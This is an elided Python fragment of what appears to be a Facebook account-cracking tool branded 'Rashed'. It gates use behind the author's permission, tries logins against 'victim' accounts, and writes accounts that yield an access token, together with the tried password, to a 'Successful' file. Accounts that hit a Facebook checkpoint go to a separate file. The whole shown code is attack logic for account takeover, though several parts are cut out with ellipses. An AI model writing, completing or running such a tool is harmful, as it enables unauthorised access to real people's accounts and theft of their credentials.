...
if Permission=="On":
  ...
  motion(ccl+"You Need too Rashed's Permission")
  time.sleep(2)
  ...
  def main(arg):
    try:
      ...
      if 'access_token' in q:
        motion (ccl+'\n[RASHED_OK] ' + victim + '  |  ' + line+"\n")
        okb = open('save/RASHED_Successful.txt', 'a')
        okb.write(victim +" [ RASHED ] "+ line + '\n')
        okb.close()
                  
      elif 'www.facebook.com' in q['error_msg']:
        motion( ycl+'\n[RASHED_CP] ' +victim+'  |  '+ycl + line+"\n")
        cps = open('save/Rashed_CheckPoint.txt', 'a')
